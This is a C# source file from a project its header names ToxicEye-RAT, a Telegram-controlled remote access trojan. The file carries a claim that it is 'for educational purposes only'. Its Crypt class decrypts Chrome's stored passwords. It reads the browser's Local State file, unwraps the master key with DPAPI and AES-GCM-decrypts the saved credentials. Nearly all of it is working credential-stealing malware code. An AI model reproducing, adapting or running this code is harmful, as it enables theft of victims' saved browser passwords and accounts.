/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.Linq;
using System.Text;

namespace TelegramRAT
{
    internal class Crypt
    {

        // Decrypt value from Chrome > 80 version.
        public static string decryptChrome(string password, string browser = "")
            {
            // If Chromium version > 80
            if (password.StartsWith("v10") || password.StartsWith("v11"))
            {
                // Get masterkey location
                string masterKey, masterKeyPath = "";
                foreach (string l_s in new string[] { "", "\\..", "\\..\\.." })
                {
                    masterKeyPath = Path.GetDirectoryName(browser) + l_s + "\\Local State";
                    if (File.Exists(masterKeyPath))
                    {
                        break;
                    }
                    else
                    {
                        masterKeyPath = null;
                        continue;
                    }
                }
                // Get master key
                masterKey = File.ReadAllText(masterKeyPath);
                masterKey = SimpleJSON.JSON.Parse(masterKey)["os_crypt"]["encrypted_key"];
                // Decrypt master key
                byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(masterKey)).Remove(0, 5));
                byte[] masterKeyBytes = DPAPI.Decrypt(keyBytes, null, out string _);
                byte[] bytePassword = Encoding.Default.GetBytes(password).ToArray();
                // Decrypt password by master-key
                try { 
                    byte[] iv = bytePassword.Skip(3).Take(12).ToArray(); // From 3 to 15
                    byte[] payload = bytePassword.Skip(15).ToArray(); // from 15 to end
                    string decryptedPassword = Encoding.Default.GetString(Sodium.SecretAeadAes.Decrypt(payload, iv, masterKeyBytes));
                    return decryptedPassword;
                }
                catch { return "failed (AES-GCM)"; }

                // return decryptedPassword;
            } else {
                try {
                    return Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password), null, out string _)); ;
                } catch { return "failed (DPAPI)"; }
            }
        }

        // Convert 1251 to UTF8
        public static string toUTF8(string text)
        {
            Encoding utf8 = Encoding.GetEncoding("UTF-8");
            Encoding win1251 = Encoding.GetEncoding("Windows-1251");

            byte[] utf8Bytes = win1251.GetBytes(text);
            byte[] win1251Bytes = Encoding.Convert(utf8, win1251, utf8Bytes);
            
            return win1251.GetString(win1251Bytes);
        }

    }
}
